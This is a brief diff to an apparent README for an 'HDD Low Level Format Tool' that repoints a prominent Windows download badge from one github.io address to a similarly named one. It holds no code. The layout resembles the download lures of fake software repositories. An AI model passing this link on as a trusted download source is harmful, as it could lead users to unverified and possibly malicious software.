@@ -2,7 +2,8 @@
 
 ## 📥 Download HDD Low Level Format Tool
 
-[![⬇️ Download HDD Low Level Format Tool](https://img.shields.io/badge/Download-HDD%20Low%20Level%20Format%20Tool-blue?style=for-the-badge&logo=windows)](https://hdd-low-level-format-tool.github.io/.github)
+[![⬇️ Download HDD Low Level Format Tool](https://img.shields.io/badge/Download-HDD%20Low%20Level%20Format%20Tool-blue?style=for-the-badge&logo=windows)](https://hdd-low-level-format-tool-utility.github.io/.github
+)
 
 ---
 
